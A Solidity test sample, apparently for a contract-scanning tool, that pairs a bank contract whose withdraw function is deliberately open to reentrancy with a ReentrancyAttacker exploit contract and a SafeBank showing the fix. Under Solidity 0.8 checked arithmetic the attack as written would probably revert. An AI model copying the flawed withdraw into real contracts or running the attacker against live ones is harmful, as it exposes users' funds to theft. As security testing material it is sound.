// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vulnerable Contract - Test Sample for MantleGuard
 * @notice This contract contains intentional vulnerabilities for testing
 * @dev Use this with MantleGuard extension to test all features
 */
contract VulnerableBank {
    // State variables
    mapping(address => uint256) public balances;
    address public owner;
    bool private locked;
    
    // Events
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    // Modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    modifier noReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    /**
     * @notice Deposit ETH into the contract
     * @dev Allows anyone to deposit funds
     */
    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw funds - VULNERABLE TO REENTRANCY
     * @dev This function has a reentrancy vulnerability
     * @param amount Amount to withdraw
     */
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update after external call (BAD!)
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @notice Safe withdraw with reentrancy guard
     * @param amount Amount to withdraw
     */
    function safeWithdraw(uint256 amount) public noReentrancy {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // State update BEFORE external call (GOOD!)
        balances[msg.sender] -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @notice Emergency withdraw - only owner
     */
    function emergencyWithdraw() public onlyOwner {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @notice Transfer ownership
     * @param newOwner Address of new owner
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid address");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }
    
    /**
     * @notice Get contract balance
     * @return Current ETH balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Get user balance
     * @param user User address
     * @return User's balance
     */
    function getUserBalance(address user) public view returns (uint256) {
        return balances[user];
    }
    
    /**
     * @notice Inefficient loop - GAS OPTIMIZATION NEEDED
     * @dev This function wastes gas
     */
    function inefficientFunction() public view returns (uint256) {
        uint256 sum = 0;
        for (uint256 i = 0; i < 1000; i++) {
            sum += i;
        }
        return sum;
    }
    
    /**
     * @notice Function with redundant checks
     */
    function redundantChecks(uint256 value) public pure returns (bool) {
        require(value > 0, "Must be positive");
        require(value > 0, "Must be positive"); // REDUNDANT!
        require(value < 1000, "Too large");
        return true;
    }
    
    // Fallback and receive
    receive() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    fallback() external payable {
        revert("Fallback not allowed");
    }
}

/**
 * @title Attack Contract - Reentrancy Exploit
 * @notice This contract exploits the vulnerable withdraw function
 */
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackCount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(payable(_bankAddress));
    }
    
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }
    
    receive() external payable {
        if (attackCount < 5 && address(bank).balance >= msg.value) {
            attackCount++;
            bank.withdraw(msg.value);
        }
    }
}

/**
 * @title Safe Contract - Best Practices
 * @notice This contract follows security best practices
 */
contract SafeBank {
    mapping(address => uint256) public balances;
    address public immutable owner;
    bool private locked;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    function deposit() external payable nonReentrant {
        require(msg.value > 0, "Deposit: amount must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    function withdraw(uint256 amount) external nonReentrant {
        require(amount > 0, "Withdraw: amount must be greater than 0");
        require(balances[msg.sender] >= amount, "Withdraw: insufficient balance");
        
        // Checks-Effects-Interactions pattern
        balances[msg.sender] -= amount;
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw: transfer failed");
        
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {
        revert("SafeBank: use deposit() function");
    }
}
